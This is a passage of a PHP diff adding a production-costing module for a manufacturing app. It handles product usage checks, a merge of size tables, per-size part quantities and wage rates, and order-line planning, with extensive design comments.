+/* Every part's cost in ONE query, for list screens.
+   The old module asked per row and ran 300 queries to draw one table. */
+function zp_part_cost_map(): array {
+    zp_ensure_schema();
+    $out = [];
+    try {
+        $rows = db()->query("SELECT part_id, SUM(rate) t FROM zp_part_ops WHERE is_active=1 GROUP BY part_id")->fetchAll();
+        foreach ($rows as $r) $out[(int)$r['part_id']] = round((float)$r['t'], 2);
+    } catch (Throwable $e) {}
+    return $out;
+}
+
+function zp_part_op_count_map(): array {
+    zp_ensure_schema();
+    $out = [];
+    try {
+        $rows = db()->query("SELECT part_id, COUNT(*) c FROM zp_part_ops WHERE is_active=1 GROUP BY part_id")->fetchAll();
+        foreach ($rows as $r) $out[(int)$r['part_id']] = (int)$r['c'];
+    } catch (Throwable $e) {}
+    return $out;
+}
+
+/* ============================================================
+   PRODUCTS — read only. THIS MODULE NEVER DELETES A PRODUCT.
+   ============================================================ */
+
+function zp_products(bool $activeOnly = false): array {
+    $sql = "SELECT id, name, category, default_unit, is_active FROM products"
+         . ($activeOnly ? " WHERE is_active=1" : "") . " ORDER BY name";
+    try { return db()->query($sql)->fetchAll(); } catch (Throwable $e) { return []; }
+}
+
+function zp_product(int $id): ?array {
+    if ($id <= 0) return null;
+    try {
+        $st = db()->prepare("SELECT * FROM products WHERE id=?");
+        $st->execute([$id]);
+        $r = $st->fetch();
+        return $r ?: null;
+    } catch (Throwable $e) { return null; }
+}
+
+/* WHERE IS THIS PRODUCT USED — the "Used In" column in your layout.
+ *
+ * One query per table for ALL products, not one per product. Returns
+ * [product_id => ['Production', 'Invoice']]. Each lookup is wrapped on its own
+ * so a module that is not installed simply contributes nothing. */
+function zp_usage_map(): array {
+    zp_ensure_schema();
+    $out = [];
+    $add = function (int $pid, string $what) use (&$out) {
+        if ($pid <= 0) return;
+        if (!isset($out[$pid])) $out[$pid] = [];
+        if (!in_array($what, $out[$pid], true)) $out[$pid][] = $what;
+    };
+
+    /* A CHECK THAT COULD NOT RUN MUST NEVER READ AS "NOT USED".
+     *
+     * Each lookup is wrapped so a module that is not installed contributes
+     * nothing instead of breaking the page. But "this table threw" and "this
+     * table is empty" produce the SAME empty result — and if that silence is
+     * treated as proof, a product in use reads as free and Delete lights up.
+     * The one case where being wrong is unrecoverable is the one where a
+     * swallowed exception decides it.
+     *
+     * So a failed lookup is RECORDED under '__unknown'. Callers treat an
+     * unknown as used, which is the safe direction to be wrong in: the worst
+     * case is a Delete button that stays greyed out until somebody looks. */
+    $unknown = [];
+    try {
+        foreach (db()->query("SELECT DISTINCT product_id FROM zp_entries WHERE status='active'")->fetchAll() as $r)
+            $add((int)$r['product_id'], 'Production');
+    } catch (Throwable $e) { $unknown[] = 'production entries'; }
+
+    foreach ([['invoice_items', 'Invoice'], ['proforma_items', 'Proforma'], ['shipment_items', 'Shipment']] as [$tbl, $lbl]) {
+        try {
+            foreach (db()->query("SELECT DISTINCT product_id FROM `$tbl` WHERE product_id IS NOT NULL AND product_id > 0")->fetchAll() as $r)
+                $add((int)$r['product_id'], $lbl);
+        } catch (Throwable $e) { $unknown[] = str_replace('_', ' ', $tbl); }
+    }
+    if ($unknown) $out['__unknown'] = $unknown;
+    return $out;
+}
+
+/* Is this product safe to delete? An unreadable table means NO. */
+function zp_usage_unknown(array $map): array { return $map['__unknown'] ?? []; }
+
+function zp_is_used(array $map, int $productId): bool {
+    return !empty($map[$productId]) || !empty($map['__unknown']);
+}
+
+function zp_usage_label(array $map, int $productId): string {
+    $u = $map[$productId] ?? [];
+    if ($u) return 'Yes (' . implode(', ', $u) . ')';
+    /* NOT "No" — we do not know. Saying No here is what would make a delete
+       button appear for a product we simply failed to check. */
+    $unk = zp_usage_unknown($map);
+    if ($unk) return 'Could not be checked (' . implode(', ', array_slice($unk, 0, 2)) . ')';
+    return 'No';
+}
+
+/* ============================================================
+   SIZES
+   ============================================================ */
+
+/* ONE SIZE LIST FOR THE WHOLE APP, AND IT IS product_sizes.
+ *
+ * This used to read zp_sizes, and that was the mistake behind the whole size
+ * mess. product_sizes is read by SEVENTEEN files — Costing, Proforma, Search,
+ * both print screens, Final Costing, the AI screens. zp_sizes was read by
+ * three, all of them mine. Putting the new module on its own table meant a size
+ * typed in Product Master never reached any of the other seventeen, and I then
+ * wrote a bridge to copy between them, which is a workaround for a table that
+ * should never have existed.
+ *
+ * The old zp_sizes table is LEFT ON DISK, untouched. Nothing reads it any more,
+ * but it is the only copy of what was typed before this change, so it stays.
+ *
+ * The shape returned is unchanged — id and size_label — so every caller works
+ * exactly as before and simply sees the real list now. */
+function zp_sizes(int $productId): array {
+    if ($productId <= 0) return [];
+    zp_ensure_schema();
+    try {
+        $st = db()->prepare("SELECT id, product_id, size_label, COALESCE(sort_order,0) sort_order
+                             FROM product_sizes WHERE product_id=? ORDER BY sort_order, id");
+        $st->execute([$productId]);
+        return $st->fetchAll();
+    } catch (Throwable $e) { return []; }
+}
+
+/* IS ANYTHING POINTING AT THIS SIZE?
+ *
+ * A size id in product_sizes is not mine to delete. costing_version_sizes
+ * points at it, and so may a proforma line — removing one would orphan a
+ * costing somebody already approved, or a line on an order already sent.
+ *
+ * Every referrer is asked, and A CHECK THAT CANNOT RUN COUNTS AS "IN USE":
+ * an unreadable table is not evidence that nothing needs this row. */
+function zp_size_refs(int $sizeId): array {
+    $where = [];
+    $ask = function (string $sql, int $id) use (&$where) {
+        try {
+            $st = db()->prepare($sql); $st->execute([$id]);
+            return (int)$st->fetchColumn();
+        } catch (Throwable $e) {
+            $m = $e->getMessage();
+            /* a table or column that genuinely does not exist holds nothing */
+            if (stripos($m, 'exist') !== false || stripos($m, 'Unknown column') !== false) return 0;
+            return -1;                                   // unreadable = treat as used
+        }
+    };
+    $checks = [
+        'a costing'   => "SELECT COUNT(*) FROM costing_version_sizes WHERE product_size_id=?",
+        'a proforma'  => "SELECT COUNT(*) FROM proforma_items WHERE product_size_id=?",
+        'quantities'  => "SELECT COUNT(*) FROM zp_part_qty WHERE size_id=? AND qty<>1",
+        /* NO "<>" HERE, UNLIKE QUANTITIES. A zp_part_qty row of 1 is the
+           default and carries no information, so it does not count as use. But
+           zp_op_rate holds no defaults at all — somebody typed every row in it
+           on purpose, so any row is real. */
+        'size rates'  => "SELECT COUNT(*) FROM zp_op_rate WHERE size_id=?",
+    ];
+    foreach ($checks as $label => $sql) {
+        $n = $ask($sql, $sizeId);
+        if ($n !== 0) $where[] = $n < 0 ? $label . ' (could not be checked)' : $label;
+    }
+    return $where;
+}
+
+/* Replace the whole size list for a product.
+   A size you take off the list IS removed, even if something pointed at it.
+   The caller is told which ones carried something and what that was, so the
+   removal is informed rather than either refused or silent. */
+function zp_save_sizes(int $productId, array $labels): array {
+    zp_ensure_schema();
+    if ($productId <= 0) return ['ok' => false, 'error' => 'No product.', 'dropped' => []];
+
+    $clean = []; $seen = [];
+    foreach ($labels as $l) {
+        $l = trim((string)$l);
+        if ($l === '') continue;
+        $k = mb_strtolower($l);
+        if (isset($seen[$k])) continue;         // typed twice — keep the first
+        $seen[$k] = true;
+        $clean[] = mb_substr($l, 0, 60);
+    }
+
+    $existing = zp_sizes($productId);
+    $byLabel = [];
+    foreach ($existing as $s) $byLabel[mb_strtolower($s['size_label'])] = $s;
+
+    $dropped = [];
+    db()->beginTransaction();
+    try {
+        /* A SIZE IS REMOVED ONLY WHEN NOTHING ANYWHERE POINTS AT IT.
+           These ids are shared with Costing and Proforma now, so the old rule —
+           "delete it if it carries no quantity" — is nowhere near careful
+           enough. Anything still referenced is KEPT and reported by name, so
+           the list on screen always matches what is really stored. */
+        /* A SIZE YOU TOOK OFF THE LIST COMES OFF THE LIST.
+           This used to REFUSE, keeping any size that a costing, a proforma or a
+           quantity pointed at. That was safe and it was annoying: a size typed
+           by mistake could never be removed once anything had touched it, and
+           the screen then disagreed with what you had just typed.
+           Your call, and it is the right one — a rate is a number you can type
+           again. So the removal always happens; what changes is that it now
+           says what it took with it, instead of either refusing or going quiet.
+
+           ONE CONSEQUENCE WORTH KNOWING, which is why it is reported rather
+           than silent: proforma_items.product_size_id goes dead, so
+           zp_pieces_needed() returns ZP_NO_SIZE and THAT ORDER LINE CANNOT BE
+           BOOKED until a size is linked again. Wages already booked are safe —
+           every entry froze its own rate — but no new ones can go on. Daily
+           Entry names the line in its red banner, so it is findable. */
+        foreach ($existing as $s) {
+            if (isset($seen[mb_strtolower($s['size_label'])])) continue;
+            $sid  = (int)$s['id'];
+            $refs = zp_size_refs($sid);
+            if ($refs) $dropped[] = $s['size_label'] . ' (it was used by ' . implode(', ', $refs) . ')';
+            db()->prepare("DELETE FROM zp_op_rate  WHERE size_id=?")->execute([$sid]);
+            db()->prepare("DELETE FROM zp_part_qty WHERE size_id=?")->execute([$sid]);
+            db()->prepare("DELETE FROM product_sizes WHERE id=?")->execute([$sid]);
+        }
+        /* add the new ones, in the order given */
+        $ins = db()->prepare("INSERT INTO product_sizes (product_id, size_label, sort_order) VALUES (?,?,?)");
+        $upd = db()->prepare("UPDATE product_sizes SET sort_order=? WHERE id=?");
+        foreach ($clean as $i => $l) {
+            $have = $byLabel[mb_strtolower($l)] ?? null;
+            if ($have) $upd->execute([$i, (int)$have['id']]);
+            else       $ins->execute([$productId, $l, $i]);
+        }
+        db()->commit();
+    } catch (Throwable $e) {
+        db()->rollBack();
+        return ['ok' => false, 'error' => 'Nothing was saved. ' . $e->getMessage(), 'dropped' => []];
+    }
+    return ['ok' => true, 'error' => '', 'dropped' => $dropped];
+}
+
+/* ============================================================
+   THE ONE-TIME MOVE FROM zp_sizes TO product_sizes
+   ============================================================
+
+   Quantities typed before this change are keyed by zp_sizes ids. They are
+   re-pointed at the matching product_sizes row, matched on the label.
+
+   NOTHING IS DELETED. The zp_sizes table stays exactly as it is — it is the
+   only record of what was typed, and if any of this is wrong it is the only way
+   back. A size in zp_sizes with no twin in product_sizes is CREATED there
+   rather than dropped, so "pillow = 2 on Double" survives even if Double only
+   ever existed on the production side.
+
+   IT RUNS ONCE. A marker row records that, because re-running after somebody
+   renamed a size would re-point quantities at the wrong row. */
+function zp_meta_get(string $k): string {
+    try {
+        db()->exec("CREATE TABLE IF NOT EXISTS zp_meta (k VARCHAR(60) PRIMARY KEY, v VARCHAR(255) NULL)");
+        $st = db()->prepare("SELECT v FROM zp_meta WHERE k=?"); $st->execute([$k]);
+        $v = $st->fetchColumn();
+        return $v === false ? '' : (string)$v;
+    } catch (Throwable $e) { return ''; }
+}
+function zp_meta_set(string $k, string $v): void {
+    try {
+        db()->prepare("INSERT INTO zp_meta (k,v) VALUES (?,?) ON DUPLICATE KEY UPDATE v=VALUES(v)")
+            ->execute([$k, $v]);
+    } catch (Throwable $e) {}
+}
+
+function zp_size_migrate(bool $force = false): array {
+    zp_ensure_schema();
+    if (!$force && zp_meta_get('size_merge') !== '')
+        return ['ran' => false, 'moved' => 0, 'added' => 0, 'note' => 'Already done on ' . zp_meta_get('size_merge')];
+
+    $moved = 0; $added = 0;
+    try {
+        $old = db()->query("SELECT id, product_id, size_label FROM zp_sizes ORDER BY product_id, id")->fetchAll();
+    } catch (Throwable $e) {
+        zp_meta_set('size_merge', date('Y-m-d H:i'));
+        return ['ran' => true, 'moved' => 0, 'added' => 0, 'note' => 'There was no old size table to move.'];
+    }
+    if (!$old) {
+        zp_meta_set('size_merge', date('Y-m-d H:i'));
+        return ['ran' => true, 'moved' => 0, 'added' => 0, 'note' => 'The old size table was empty.'];
+    }
+
+    try {
+        $byProduct = [];
+        foreach (db()->query("SELECT id, product_id, size_label FROM product_sizes")->fetchAll() as $r)
+            $byProduct[(int)$r['product_id']][mb_strtolower(trim($r['size_label']))] = (int)$r['id'];
+
+        $ins  = db()->prepare("INSERT INTO product_sizes (product_id, size_label) VALUES (?,?)");
+        $move = db()->prepare("UPDATE zp_part_qty SET size_id=? WHERE size_id=? AND product_id=?");
+        foreach ($old as $o) {
+            $pid = (int)$o['product_id'];
+            $key = mb_strtolower(trim((string)$o['size_label']));
+            if ($key === '') continue;
+            $newId = $byProduct[$pid][$key] ?? 0;
+            if (!$newId) {
+                $ins->execute([$pid, trim((string)$o['size_label'])]);
+                $newId = (int)db()->lastInsertId();
+                $byProduct[$pid][$key] = $newId;
+                $added++;
+            }
+            if ($newId !== (int)$o['id']) {
+                $move->execute([$newId, (int)$o['id'], $pid]);
+                $moved += $move->rowCount();
+            }
+        }
+    } catch (Throwable $e) {
+        return ['ran' => false, 'moved' => $moved, 'added' => $added,
+                'note' => 'Stopped part-way: ' . $e->getMessage() . ' Nothing was deleted, so it is safe to run again.'];
+    }
+    zp_meta_set('size_merge', date('Y-m-d H:i'));
+    return ['ran' => true, 'moved' => $moved, 'added' => $added, 'note' => ''];
+}
+
+/* ============================================================
+   PRODUCT PARTS AND PER-SIZE QUANTITIES
+   ============================================================ */
+
+function zp_product_parts(int $productId): array {
+    if ($productId <= 0) return [];
+    zp_ensure_schema();
+    $st = db()->prepare("SELECT pp.id link_id, pp.sort_order, p.*
+                         FROM zp_product_parts pp JOIN zp_parts p ON p.id = pp.part_id
+                         WHERE pp.product_id=? ORDER BY pp.sort_order, pp.id");
+    $st->execute([$productId]);
+    return $st->fetchAll();
+}
+
+function zp_add_product_part(int $productId, int $partId): array {
+    zp_ensure_schema();
+    if ($productId <= 0 || $partId <= 0) return ['ok' => false, 'error' => 'Pick a part first.'];
+    if (!zp_part($partId)) return ['ok' => false, 'error' => 'That part no longer exists.'];
+    $has = db()->prepare("SELECT COUNT(*) FROM zp_product_parts WHERE product_id=? AND part_id=?");
+    $has->execute([$productId, $partId]);
+    if ((int)$has->fetchColumn()) return ['ok' => false, 'error' => 'That part is already on this product.'];
+    $n = db()->prepare("SELECT COALESCE(MAX(sort_order),-1)+1 FROM zp_product_parts WHERE product_id=?");
+    $n->execute([$productId]);
+    db()->prepare("INSERT INTO zp_product_parts (product_id, part_id, sort_order) VALUES (?,?,?)")
+        ->execute([$productId, $partId, (int)$n->fetchColumn()]);
+    return ['ok' => true, 'error' => ''];
+}
+
+/* Taking a part OFF a product removes its quantities too — they describe a
+   relationship that no longer exists. Wages already booked are NOT touched:
+   they are history, and history is not edited by changing a recipe. */
+function zp_remove_product_part(int $productId, int $partId): void {
+    zp_ensure_schema();
+    db()->prepare("DELETE FROM zp_part_qty WHERE product_id=? AND part_id=?")->execute([$productId, $partId]);
+    db()->prepare("DELETE FROM zp_product_parts WHERE product_id=? AND part_id=?")->execute([$productId, $partId]);
+}
+
+/* [part_id][size_id] => qty. A MISSING ROW MEANS 1, NOT 0.
+   A part that is on the product is in it at least once; defaulting to 0 would
+   make a product quietly produce nothing and look like it was working. */
+function zp_qty_map(int $productId): array {
+    if ($productId <= 0) return [];
+    zp_ensure_schema();
+    $out = [];
+    $st = db()->prepare("SELECT part_id, size_id, qty FROM zp_part_qty WHERE product_id=?");
+    $st->execute([$productId]);
+    foreach ($st->fetchAll() as $r) $out[(int)$r['part_id']][(int)$r['size_id']] = (float)$r['qty'];
+    return $out;
+}
+
+function zp_qty_for(array $map, int $partId, int $sizeId): float {
+    return isset($map[$partId][$sizeId]) ? (float)$map[$partId][$sizeId] : 1.0;
+}
+
+/* $qty = [part_id => [size_id => qty]] */
+function zp_save_qty(int $productId, array $qty): array {
+    zp_ensure_schema();
+    if ($productId <= 0) return ['ok' => false, 'error' => 'No product.'];
+    db()->beginTransaction();
+    try {
+        $ins = db()->prepare("INSERT INTO zp_part_qty (product_id, part_id, size_id, qty) VALUES (?,?,?,?)
+                              ON DUPLICATE KEY UPDATE qty=VALUES(qty)");
+        foreach ($qty as $partId => $bySize) {
+            foreach ($bySize as $sizeId => $q) {
+                $q = (float)str_replace(',', '', (string)$q);
+                if ($q < 0) $q = 0;
+                $ins->execute([$productId, (int)$partId, (int)$sizeId, round($q, 2)]);
+            }
+        }
+        db()->commit();
+    } catch (Throwable $e) {
+        db()->rollBack();
+        return ['ok' => false, 'error' => 'Nothing was saved. ' . $e->getMessage()];
+    }
+    return ['ok' => true, 'error' => ''];
+}
+
+/* What one SET of this product costs to make, at one size:
+   every part's operation total x how many of that part go in. */
+/* TWO THINGS VARY BY SIZE, AND THEY ARE DIFFERENT THINGS.
+     HOW MANY   zp_part_qty  — a Double set has 2 pillow cases, a Single has 1
+     HOW MUCH   zp_op_rate   — a King seam is longer, so overlocking pays more
+   This used to multiply zp_part_cost(), which sums an operation's rate with no
+   idea a size exists. It now walks the operations itself so a size rate is
+   actually counted — without it, Product Master would print one set cost while
+   the wages paid another. */
+function zp_set_cost(int $productId, int $sizeId): float {
+    $qty   = zp_qty_map($productId);
+    $rates = zp_op_rate_map($productId);
+    $t = 0.0;
+    foreach (zp_product_parts($productId) as $p) {
+        $partId = (int)$p['id'];
+        $one = 0.0;
+        foreach (zp_part_ops($partId, true) as $o) {
+            $one += zp_rate_for((int)$o['id'], (float)$o['rate'], [], $rates, $sizeId);
+        }
+        $t += $one * zp_qty_for($qty, $partId, $sizeId);
+    }
+    return round($t, 2);
+}
+
+/* ============================================================
+   WHAT IS STILL MISSING BEFORE A PRODUCT CAN BE PRODUCED
+   ============================================================
+
+   Returns plain sentences. Each one names the thing AND what to do about it —
+   a checklist that tells you a fact but not the next action is just a
+   complaint. */
+function zp_product_todo(int $productId): array {
+    $todo = [];
+    $sizes = zp_sizes($productId);
+    $parts = zp_product_parts($productId);
+    if (!$sizes) $todo[] = 'No sizes yet — add them on the Basic Info tab, then come back.';
+    if (!$parts) $todo[] = 'No parts yet — press "Add Parts from Library" to choose what this product is made of.';
+    foreach ($parts as $p) {
+        $ops = zp_part_ops((int)$p['id'], true);
+        if (!$ops) {
+            $todo[] = '"' . $p['part_name'] . '" has no operations — open it in the Part Library and add its Cutting line first.';
+            continue;
+        }
+        $hasCut = false;
+        foreach ($ops as $o) if (zp_is_cutting($o['stage'])) { $hasCut = true; break; }
+        if (!$hasCut) $todo[] = '"' . $p['part_name'] . '" has no Cutting line, so nothing sets how many pieces exist.';
+    }
+    return $todo;
+}
+
+/* ============================================================
+   ORDERS — which proforma lines are being produced
+   ============================================================
+
+   `proforma_invoices.production_enabled` is an existing column and this module
+   reads it. It is the ONE thing here that touches an existing table, and only
+   to switch a flag the old module already used, so nothing is invented and
+   nothing is lost. */
+function zp_orders_schema(): void {
+    try { db()->exec("ALTER TABLE proforma_invoices ADD COLUMN production_enabled TINYINT(1) NOT NULL DEFAULT 0"); } catch (Throwable $e) {}
+}
+
+/* Resolve an order line to a master product: by the stored link first, then by
+   name. The stored link is authoritative — a line renamed on the invoice must
+   still produce the same product. */
+function zp_resolve_item(array $row): int {
+    $pid = (int)($row['product_id'] ?? 0);
+    if ($pid > 0) return $pid;
+    $name = trim((string)($row['product_name'] ?? ''));
+    if ($name === '') return 0;
+    static $byName = null;
+    if ($byName === null) {
+        $byName = [];
+        try {
+            foreach (db()->query("SELECT id, name FROM products")->fetchAll() as $p)
+                $byName[mb_strtolower(trim($p['name']))] = (int)$p['id'];
+        } catch (Throwable $e) {}
+    }
+    return $byName[mb_strtolower($name)] ?? 0;
+}
+
+/* Every order line switched on for production, already resolved. */
+function zp_open_lines(): array {
+    zp_ensure_schema(); zp_orders_schema();
+    $out = [];
+    try {
+        $rows = db()->query("SELECT pi.id item_id, pi.proforma_id, pi.product_name, pi.product_id,
+                                    pi.qty ordered_qty, pi.size, pi.product_size_id, pf.pi_no, pf.customer_name
+                             FROM proforma_items pi
+                             JOIN proforma_invoices pf ON pf.id = pi.proforma_id
+                             WHERE pf.production_enabled = 1
+                             ORDER BY pf.id DESC, pi.id")->fetchAll();
+    } catch (Throwable $e) { return []; }
+    foreach ($rows as $r) {
+        $pid = zp_resolve_item($r);
+        if (!$pid) continue;                       // a line matching no product cannot be produced
+        $r['product_id'] = $pid;
+        $out[] = $r;
+    }
+    return $out;
+}
+
+/* ============================================================
+   PROGRESS — what has actually been booked
+   ============================================================
+
+   ONE QUERY for the whole screen, not one per line. Returns
+   [item_id][part_id][op_id] => qty, and a stage roll-up alongside it.
+   Cancelled rows are excluded here, which is the single place that decision is
+   made — so a cancelled entry can never still be holding a limit down. */
+function zp_progress_map(): array {
+    zp_ensure_schema();
+    $out = ['op' => [], 'stage' => []];
+    try {
+        $rows = db()->query("SELECT proforma_item_id, COALESCE(part_id,0) part_id, op_id, stage, SUM(qty) q
+                             FROM zp_entries WHERE status='active'
+                             GROUP BY proforma_item_id, part_id, op_id, stage")->fetchAll();
+    } catch (Throwable $e) { return $out; }
+    foreach ($rows as $r) {
+        $it = (int)$r['proforma_item_id']; $pt = (int)$r['part_id'];
+        $out['op'][$it][$pt][(int)$r['op_id']] = (float)$r['q'];
+        $key = zp_is_cutting($r['stage']) ? 'cut' : 'stitched';
+        $out['stage'][$it][$pt][$key] = ((float)($out['stage'][$it][$pt][$key] ?? 0)) + (float)$r['q'];
+    }
+    return $out;
+}
+
+/* HOW MANY PIECES OF THIS PART ONE ORDER LINE NEEDS.
+   ordered sets x how many of that part go into one set, at that line's size. */
+/* WHICH SIZE IS THIS ORDER LINE?
+ *
+ * BY ID FIRST. The proforma line now carries product_size_id, so there is
+ * nothing to guess — it is the same row Costing priced and the same row
+ * Product Master typed.
+ *
+ * BY LABEL ONLY AS A FALLBACK, for lines written before that column existed.
+ * Matching on typed text is exactly how the old bug worked, so it is the second
+ * answer here, never the first.
+ *
+ * Returns 0 when neither resolves. The caller must then REFUSE, not assume. */
+function zp_line_size_id(array $line): int {
+    $sid = (int)($line['product_size_id'] ?? 0);
+    if ($sid > 0) return $sid;
+    $want = mb_strtolower(trim((string)($line['size'] ?? '')));
+    if ($want === '') return 0;
+    foreach (zp_sizes((int)$line['product_id']) as $s)
+        if (mb_strtolower(trim($s['size_label'])) === $want) return (int)$s['id'];
+    return 0;
+}
+
+/* HOW MANY PIECES OF THIS PART ONE ORDER LINE NEEDS.
+ *
+ * ordered sets x how many of that part go into one set, AT THAT LINE'S SIZE.
+ * A Double using two pillow cases needs TWO per set — 500 sets is 1,000
+ * overlocks, not 500.
+ *
+ * WHY THERE IS NO LONGER A FALLBACK OF 1.
+ *
+ * This used to return `ordered x 1` when the size matched nothing, defended on
+ * the grounds that 1 is better than 0. That was the wrong pair of options. The
+ * real choice was between GUESSING and SAYING SO, and guessing is worse here
+ * because it always guesses LOW: a Double that really takes two pillow cases
+ * gets planned as one, the order reads finished at half done, and half the
+ * wages are never bookable. The number is wrong and nothing on any screen says
+ * so.
+ *
+ * So an unresolvable size now returns -1, which means "I cannot plan this
+ * line". The entry screen shows it in red and names the order, the product and
+ * the size, and nothing can be booked against it until the size is linked. */
+const ZP_NO_SIZE = -1.0;
+
+function zp_pieces_needed(array $line, int $partId): float {
+    $pid    = (int)$line['product_id'];
+    $sizeId = zp_line_size_id($line);
+    if ($sizeId <= 0) return ZP_NO_SIZE;
+    return (float)$line['ordered_qty'] * zp_qty_for(zp_qty_map($pid), $partId, $sizeId);
+}
+
+/* Why a line cannot be planned, in words somebody can act on. */
+function zp_size_problem(array $line): string {
+    if (zp_line_size_id($line) > 0) return '';
+    $size = trim((string)($line['size'] ?? ''));
+    $have = array_column(zp_sizes((int)$line['product_id']), 'size_label');
+    return $size === ''
+        ? 'No size is set on this line of ' . (string)($line['pi_no'] ?? 'the order')
+          . ', so the pieces per set cannot be worked out.'
+        : (string)($line['pi_no'] ?? 'This order') . ' says "' . $size . '", but '
+          . (string)($line['product_name'] ?? 'that product') . ' has '
+          . ($have ? 'only ' . implode(', ', $have) : 'no sizes at all')
+          . '. Link the size on the proforma line.';
+}
+
+/* HOW MANY CAN STILL BE BOOKED against one operation of one part on one line.
+ *
+ * Two ceilings, and the tighter one wins:
+ *
+ *   CUTTING      capped by what the order needs. Cutting is what creates
+ *                pieces, so the plan is the only thing that can cap it.
+ *   STITCHING    capped by what has actually been CUT — never by the plan.
+ *                Stitching 500 when 300 were cut is not ambition, it is a
+ *                mistake or a mis-credit, and the number should refuse it.
+ *
+ * AND each operation is capped by ITS OWN booked total. Two stitching
+ * operations on the same part (Overlock and Singer) each get the full
+ * allowance, because each is a separate job done to every piece. Capping them
+ * against a shared pool was a real bug in the old module: booking 150 on one
+ * silently ate the other's allowance. */
+function zp_remaining(array $line, int $partId, int $opId, string $stage, array $prog): float {
+    $itemId = (int)$line['item_id'];
+    $needed = zp_pieces_needed($line, $partId);
+    /* A LINE WHOSE SIZE CANNOT BE RESOLVED ALLOWS NOTHING.
+       Letting ZP_NO_SIZE through would make the ceiling negative and max(0,...)
+       would turn that into a flat zero — which reads on screen exactly like
+       "this is finished". Refusing explicitly is the only honest answer, and
+       zp_size_problem() is what tells the person why. */
+    if ($needed === ZP_NO_SIZE) return 0.0;
+    $done   = (float)($prog['op'][$itemId][$partId][$opId] ?? 0);
+    if (zp_is_cutting($stage)) {
+        $ceiling = $needed;
+    } else {
+        $cut = (float)($prog['stage'][$itemId][$partId]['cut'] ?? 0);
+        $ceiling = min($needed, $cut);
+    }
+    return max(0.0, $ceiling - $done);
+}
+
+/* THE RATE THIS ORDER ACTUALLY PAYS.
+   The part's standard rate, unless this order carries an approved amendment. */
+function zp_order_rate_map(int $proformaId): array {
+    zp_ensure_schema();
+    $out = [];
+    if ($proformaId <= 0) return $out;
+    try {
+        $st = db()->prepare("SELECT op_id, rate FROM zp_order_rates WHERE proforma_id=?");
+        $st->execute([$proformaId]);
+        foreach ($st->fetchAll() as $r) $out[(int)$r['op_id']] = (float)$r['rate'];
+    } catch (Throwable $e) {}
+    return $out;
+}
+/* ============================================================
+   RATES THAT DIFFER BY SIZE
+   ============================================================ */
+
+/* [part_op_id][size_id] => rate, for one product. Same shape as zp_qty_map(). */
+function zp_op_rate_map(int $productId, bool $fresh = false): array {
+    /* zp_work_index() asks for this once per ORDER LINE, and a busy floor has
+       hundreds. Held for the request so it is one query per product.
+       $fresh re-reads — the save uses it, so a page that saves and then draws
+       the grid again in the same request cannot show pre-save numbers. */
+    static $cache = [];
+    if ($fresh) $cache = [];
+    if ($productId <= 0) return [];
+    if (isset($cache[$productId])) return $cache[$productId];
+    zp_ensure_schema();
+    $out = [];
+    try {
+        $st = db()->prepare("SELECT part_op_id, size_id, rate FROM zp_op_rate WHERE product_id=?");
+        $st->execute([$productId]);
+        foreach ($st->fetchAll() as $r) $out[(int)$r['part_op_id']][(int)$r['size_id']] = (float)$r['rate'];
+    } catch (Throwable $e) {}
+    return $cache[$productId] = $out;
+}
+
+
+/* Replace this product's size rates with exactly what was sent.
+   $rows = [['op' => part_op_id, 'size' => size_id, 'rate' => float|null], ...]
+   A null or blank rate REMOVES the override, which is how a cell goes back to
+   inheriting. Anything not mentioned is left alone, so a grid showing one part
+   cannot wipe another part's rates. */
+function zp_op_rate_save(int $productId, array $rows, int $userId = 0): array {
+    zp_ensure_schema();
+    if ($productId <= 0) return ['ok' => false, 'error' => 'No product.', 'set' => 0, 'cleared' => 0];
+
+    /* the standard rate of every operation this product uses, so a cell typed
+       back to the standard can be stored as "no override" rather than as a row
+       that quietly disconnects that size from the standard for ever */
+    $std = [];
+    foreach (zp_product_parts($productId) as $p)
+        foreach (zp_part_ops((int)$p['id'], false) as $o) $std[(int)$o['id']] = (float)$o['rate'];
+
+    $sizes = [];
+    foreach (zp_sizes($productId) as $s) $sizes[(int)$s['id']] = true;
+
+    $set = 0; $cleared = 0;
+    try {
+        db()->beginTransaction();
+        $ins = db()->prepare("INSERT INTO zp_op_rate (product_id, part_op_id, size_id, rate, created_by)
+                              VALUES (?,?,?,?,?)
+                              ON DUPLICATE KEY UPDATE rate=VALUES(rate), updated_at=NOW()");
+        $del = db()->prepare("DELETE FROM zp_op_rate WHERE product_id=? AND part_op_id=? AND size_id=?");
+        foreach ($rows as $r) {
+            $op = (int)($r['op'] ?? 0); $sz = (int)($r['size'] ?? 0);
+            /* an operation this product does not use, or a size it does not
+               have, is refused rather than stored — a row nothing can ever read
+               is indistinguishable from a bug */
+            if ($op <= 0 || !isset($std[$op]) || !isset($sizes[$sz])) continue;
+            $raw = $r['rate'] ?? null;
+            $blank = ($raw === null || $raw === '' || !is_numeric($raw));
+            if ($blank) { $del->execute([$productId, $op, $sz]); $cleared += $del->rowCount(); continue; }
+            $val = round((float)$raw, 2);
+            if ($val < 0) continue;
+            /* TYPING THE STANDARD IS NOT AN OVERRIDE. Storing 5.00 against a
+               standard of 5.00 creates a row that does nothing except stop the
+               standard from ever reaching this size again — a trap found months
+               later, when the standard moves and one size silently does not. */
+            if (abs($val - $std[$op]) < 0.0001) { $del->execute([$productId, $op, $sz]); $cleared += $del->rowCount(); continue; }
+            $ins->execute([$productId, $op, $sz, $val, $userId ?: null]);
+            $set++;
+        }
+        db()->commit();
+    } catch (Throwable $e) {
+        if (db()->inTransaction()) db()->rollBack();
+        return ['ok' => false, 'error' => 'Nothing was saved. ' . $e->getMessage(), 'set' => 0, 'cleared' => 0];
+    }
+    zp_op_rate_map(0, true);        // the map just changed; drop the cached copy
+    return ['ok' => true, 'error' => '', 'set' => $set, 'cleared' => $cleared];
+}
+
+/* WHAT A PIECE ACTUALLY PAYS — most specific wins.
+ *
+ *   1. this order        zp_order_rates      one PO negotiated differently
+ *   2. this size         zp_op_rate          a King seam is longer than a Single
+ *   3. the standard      zp_part_ops.rate    what the part normally pays
+ *
+ * Both override maps empty gives exactly the behaviour this app had before
+ * either existed, which is the property that makes them safe to add.
+ *
+ * The ORDER still beats the SIZE: an amendment on a PO is somebody stating, in
+ * writing and with a reason, what that customer's work pays. A product-level
+ * size rate is a default. A default does not get to overrule a signed
+ * arrangement.
+ */
+function zp_rate_for(int $opId, float $standard, array $map,
+                     array $sizeMap = [], int $sizeId = 0): float {
+    if (array_key_exists($opId, $map)) return (float)$map[$opId];
